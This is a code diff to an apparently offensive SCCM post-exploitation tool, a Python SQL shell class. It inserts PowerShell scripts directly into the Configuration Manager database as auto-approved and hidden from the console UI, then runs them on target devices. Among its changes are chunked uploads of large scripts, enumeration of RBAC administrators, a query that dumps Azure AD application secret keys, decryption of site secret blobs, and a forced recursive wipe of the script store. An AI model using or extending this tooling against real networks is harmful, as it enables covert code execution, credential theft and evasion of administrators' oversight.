@@ -9,7 +9,7 @@ import sys
 import uuid
 import zlib
 from base64 import b64decode, b64encode
-from binascii import hexlify, unhexlify
+from binascii import hexlify, unhexlify, a2b_base64
 from datetime import datetime
 from hashlib import sha256
 from json import loads
@@ -152,7 +152,7 @@ SELECT s.SiteCode, s.Version as Version, s.BuildNumber, @result as Settings, isn
 class SCCM_SQLSHELL(cmd.Cmd):
 
     # On MP, the path is different, delete from current location too
-    _clean_scriptstore_cmd = 'Remove-Item ./{guid}_*'
+    _clean_scriptstore_cmd = 'Remove-Item -Force -Recurse -ErrorAction SilentlyContinue ./*'
     _clean_scriptstore = True
 
 
@@ -379,6 +379,17 @@ class SCCM_SQLSHELL(cmd.Cmd):
             f"WHERE isActive=1 AND Name LIKE '%{filter}%' ) t"
         )
 
+    def do_sccm_admins_rbac(self, filter=""):
+        self.__run(
+            f"SELECT top {self._limit} a.AdminID, a.LogonName, a.IsGroup, a.IsDeleted, a.SourceSite, e.RoleID, r.RoleName, e.ScopeID, c.CategoryName AS ScopeName, e.ScopeTypeID " 
+            f"FROM CM_{self._site_code}..RBAC_Admins a "
+            f"JOIN CM_{self._site_code}..RBAC_ExtendedPermissions e ON a.AdminID = e.AdminID "
+            f"LEFT JOIN CM_{self._site_code}..RBAC_Roles r ON e.RoleID = r.RoleID "
+            f"LEFT JOIN CM_{self._site_code}..RBAC_Categories c ON e.ScopeID = c.CategoryID "
+            f"WHERE LogonName LIKE '%{filter}%' OR RoleName LIKE '%{filter}%'"
+            f"ORDER BY a.LogonName"
+        )
+
     # get clients with a software installed
     def do_sccm_software_inventory(self, filter=""):
         filters = filter.split(" ")
@@ -419,7 +430,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             f"WHERE ScriptName LIKE '%{filter}%' OR ScriptGuid LIKE '%{filter}%'"
         )
 
-    def do_sccm_script_add(self, script_name="", script_guid=None, script_content=None):
+    def do_sccm_script_add(self, script_name="", script_guid=None, script_content=None, script_type = 0):
         if script_content is None and self._ps1_script_content is not None:
             script_content = self._ps1_script_content
         elif script_content is None:
@@ -435,16 +446,27 @@ class SCCM_SQLSHELL(cmd.Cmd):
                 logging.info('Prepending clean ScriptStore command to script')
                 script_content = f"{self._clean_scriptstore_cmd.format(guid=script_guid)}\n{script_content}"
             
+            logging.info(f'Script content length : {len(script_content)}')
             script_utf16_hex = hexlify(script_content.encode("utf-16")).decode()
             script_hash = sha256(script_content.encode("utf-16")).hexdigest()
             # ApprovalState = 3 => auto-approve
             # Feature = 1       => Hides it from the Configuration Manager UI (as the built-in CMPivot)
+
+            # Chunking to avoid HTTP transport size limits
+            chunk_size = 512 * 256
+            chunks = [script_utf16_hex[i:i+chunk_size] for i in range(0, len(script_utf16_hex), chunk_size)]
+
             self.__run(
                 f"INSERT INTO CM_{self._site_code}..SCRIPTS "
                 "(ScriptGuid, ScriptVersion, ScriptName, Script, ScriptType, Approver, ApprovalState, Feature, Author, LastUpdateTime, ScriptHash, Comment) values "
-                f"('{script_guid}',1,'{script_name}', 0x{script_utf16_hex}, 0 , '{self._script_approver}', 3, 1, '{self._script_author}', '', '{script_hash}', '')"
+                f"('{script_guid}',1,'{script_name}', 0x{chunks[0]}, {script_type} , '{self._script_approver}', 3, 1, '{self._script_author}', '', '{script_hash}', '')"
             )
+            for i, chunk in enumerate(chunks[1:], start=2):
+                logging.info(f'Writing chunk {i}/{len(chunks)}')
+                self.__run(
+                    f"UPDATE CM_{self._site_code}..Scripts SET Script .WRITE(0x{chunk}, NULL, 0) WHERE ScriptGuid = '{script_guid}'")
             logging.info(f"New Script added with GUID = {script_guid}")
+
 
     def do_sccm_script_delete(self, script_guid):
         # block accidental delete of the built-in CMPivot script
@@ -463,9 +485,12 @@ class SCCM_SQLSHELL(cmd.Cmd):
         for row in self.sql.rows:
             logging.info(f"Script content: {row['ScriptName']} - {row['ScriptGuid']}")
             try:
-                print(unhexlify(row['Script']).decode('utf16'))
-            except:
-                logging.warning('Failed to pretty print, dumping raw')
+                if isinstance(self.sql, SCCM_SQL_HTTP):
+                    print(a2b_base64(row['Script']).decode('utf16'))
+                else:
+                    print(unhexlify(row['Script']).decode('utf16'))
+            except Exception as e:
+                logging.warning(f'Failed to pretty print, dumping raw')
                 print(row['Script'])
 
 
@@ -490,8 +515,11 @@ class SCCM_SQLSHELL(cmd.Cmd):
 
         self.sql_query(f"SELECT ScriptHash, ScriptVersion from CM_{self._site_code}..Scripts WHERE ScriptGuid = '{script_guid}'")
         for row in self.sql.rows:
-            script_version = row["ScriptVersion"]
-            script_hash = row["ScriptHash"]
+            script_version = row.get("ScriptVersion", None)
+            script_hash = row.get("ScriptHash", None)
+            if script_version is None or script_hash is None:
+                logging.error('Failed to retrieve script version, aborting')
+                return ''
             task_param = f"<ScriptContent ScriptGuid='{script_guid}'><ScriptVersion>{script_version}</ScriptVersion><ScriptType>0</ScriptType><ScriptHash ScriptHashAlg='SHA256'>{script_hash}</ScriptHash><ScriptParameters></ScriptParameters><ParameterGroupHash ParameterHashAlg='SHA256'></ParameterGroupHash></ScriptContent>"
             self.__run(
                 f"INSERT INTO CM_{self._site_code}..BGB_Task "
@@ -577,7 +605,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             task_guid = str(uuid.uuid4())
             self._last_taskid = task_guid
             self._last_scriptid = script_guid
-            logging.info(f"Generated UUIDs: TaskGUID={task_guid} ScriptGUID={script_guid}")
+            logging.info(f"Generated UUIDs: TaskGUID:ScriptGUID => {task_guid}:{script_guid}")
             self.sql_query(f"SELECT Name0 FROM CM_{self._site_code}..v_R_System WHERE ResourceID = {resource_id}")
             if len(self.sql.rows) == 1:
                 logging.info(f"Found target device : ResourceID={resource_id} Name={self.sql.rows[0]['Name0']}")
@@ -594,6 +622,10 @@ class SCCM_SQLSHELL(cmd.Cmd):
                 logging.root(f"Failed to find device with ResourceID={resource_id}!")
 
     # Script execution helpers
+    def do_last_task_set(self, ids=""):
+        self._last_taskid, self._last_scriptid = ids.split(':')
+        self.do_last_task_info('')
+
     def do_last_task_clean(self, filter=""):
         if self._last_taskid is None and self._last_scriptid is None:
             logging.error("No Task executed recently")
@@ -613,12 +645,15 @@ class SCCM_SQLSHELL(cmd.Cmd):
         else:
             self.sql_query(f"SELECT top {self._limit} ScriptOutput FROM CM_{self._site_code}..ScriptsExecutionStatus WHERE TaskID LIKE '%{self._last_taskid}%'")
             for row in self.sql.rows:
-                script_output = row["ScriptOutput"]
-                try:
-                    print("\n".join(loads(script_output)))
-                except:
-                    logging.warning('Failed to pretty print, dumping raw')
-                    print(script_output.encode('utf-8').decode('unicode_escape'))
+                script_output = row.get("ScriptOutput", None)
+                if script_output is None :
+                    logging.error('No Script output, maybe an error?')
+                else:
+                    try:
+                        print("\n".join(loads(script_output)))
+                    except:
+                        logging.warning('Failed to pretty print, dumping raw')
+                        print(script_output.encode('utf-8').decode('unicode_escape'))
 
     def do_last_task_info(self, filter):
         if self._last_taskid is None and self._last_scriptid is None:
@@ -635,7 +670,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
                    f"WHERE ua.UserName LIKE '%{filter}%'")
 
     def do_sccm_aad_apps(self, filter=""):
-        self.__run(f"SELECT top {self._limit} a.ID, t.TenantID, t.Name as TenantName,  a.ClientID, a.Name, a.LastUpdateTime, a.SecretKey, a.SecretKeyForSCP " 
+        self.__run(f"SELECT top {self._limit} a.ID, t.TenantID, t.Name as TenantName,  a.ClientID, a.Name, a.LastUpdateTime, a.SecretKeyExpiry, a.SecretKey, a.SecretKeyForSCP " 
                    f"FROM CM_{self._site_code}..AAD_Application_Ex  a "
                    f"LEFT JOIN CM_{self._site_code}..AAD_Tenant_Ex  t on t.ID = a.TenantDB_ID "
                     f"WHERE a.Name LIKE '%{filter}%'")
@@ -649,7 +684,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             # add check that resource_id points to Management Point
             resource_id, blob = line.split(" ")
 
-            if blob.startswith("0C0100"):
+            if blob.upper().startswith("0C0100"):
                 self._ps1_script_content = self._crypto_decrypt.format(BLOB=blob)
             elif blob.startswith("3082"):
                 self._ps1_script_content = self._crypto_decrypt_useSiteSystemKey.format(BLOB=blob) 
